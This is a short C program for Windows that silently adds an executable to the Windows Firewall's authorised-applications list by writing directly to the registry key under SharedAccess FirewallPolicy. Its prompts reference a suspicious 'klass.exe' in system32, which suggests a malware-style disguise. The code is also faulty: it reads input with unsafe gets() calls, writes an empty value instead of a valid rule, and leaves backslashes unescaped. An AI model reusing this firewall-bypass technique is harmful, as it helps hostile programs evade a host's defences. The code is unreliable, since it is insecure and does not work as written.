#include <stdio.h>
#include <windows.h>

LONG WINAPI RegCloseKey(
  __in  HKEY hKey
);

LONG WINAPI RegSetValueEx(
  __in        HKEY hKey,
  __in_opt    LPCTSTR lpValueName,
  __reserved  DWORD Reserved,
  __in        DWORD dwType,
  __in_opt    const BYTE *lpData,
  __in        DWORD cbData
);

LONG WINAPI RegOpenKeyEx(
  __in        HKEY hKey,
  __in_opt    LPCTSTR lpSubKey,
  __reserved  DWORD ulOptions,
  __in        REGSAM samDesired,
  __out       PHKEY phkResult
);


int AddToWindowsFirewall(char *displayname,char * exepath);

int main()
{
char dspname[MAX_PATH] = "";
char exepath[MAX_PATH] = "";

printf("Windows Klass: ");
gets(dspname);

printf("C:\windows\system32\klass.exe: ");
gets(exepath);

if(AddToWindowsFirewall(dspname,exepath))
{
}else{
}
return 0;
}

int AddToWindowsFirewall(char *displayname,char * exepath)
{
HKEY hKey;

char filedata[MAX_PATH] = "";

if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"System\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List",0,KEY_ALL_ACCESS,&hKey)) return 0;
if(RegSetValueEx(hKey,exepath,0,REG_SZ,(unsigned char*)filedata,sizeof(filedata))) return 0;

RegCloseKey(hKey);

return 1;//Success
}